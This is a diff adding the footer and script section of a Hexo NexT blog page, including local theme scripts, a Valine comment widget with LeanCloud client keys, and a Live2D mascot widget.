+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'gf3X3bhGvA1TTaRXpIJrXU8Q-gzGzoHsz# Your leancloud application appid',
+      appKey     : 'PhQvOaVhLbUmODpCMAScvMqy# Your leancloud application appkey',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : false,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":180,"height":360},"dialog":{"enable":false},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
